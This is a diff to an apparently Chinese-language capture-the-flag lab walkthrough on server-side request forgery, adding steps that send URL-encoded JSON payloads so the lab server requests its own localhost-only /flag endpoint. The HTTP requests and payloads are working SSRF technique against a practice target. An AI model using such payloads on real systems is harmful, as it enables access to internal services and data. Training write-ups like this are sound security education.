@@ -69,7 +69,7 @@ no ref in json found!
 %7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D
 ```
 
-**第 4 步：发送请求**
+**第 4 步（演示）：发送请求，让靶场自请求 /ssrf/flag**
 
 ```http
 GET /ssrf/json-in-get?json=%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D HTTP/1.1
@@ -84,11 +84,24 @@ Host: 127.0.0.1:36870
 </div>
 ```
 
-（uuid 每次请求都不同，属正常现象。）
+（uuid 每次请求都不同。）这个随机 uuid 是**上游演示接口**的产物，不是本题要提交的 flag——本题 flag 读靶机根路径 `/flag`（见下一步）。
 
-**第 5 步：提交答案**
+**第 5 步：用 SSRF 读取本实例 flag**
 
-回到题目详情页，提交你拿到的完整 `flag{uuid}` 原文。
+靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`），读取端点在靶机根路径 `GET /flag`（校验与 `/ssrf/flag` 相同：只信任 Host 含 `127.0.0.1` 的服务端本机请求）。
+
+把攻击请求里的目标从 `/ssrf/flag` 换成 `/flag`（`ref` 指向靶机根路径的读取端点），整体 URL 编码后发送：
+
+```http
+GET /ssrf/json-in-get?json=%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fflag%22%7D HTTP/1.1
+Host: 127.0.0.1:36870
+```
+
+响应中就是 flag 原文（`flag{lab-...}`）。
+
+**第 6 步：提交答案**
+
+回到题目详情页，在答案框输入 flag 原文（`flag{lab-...}` 整串）提交。
 
 </details>
 
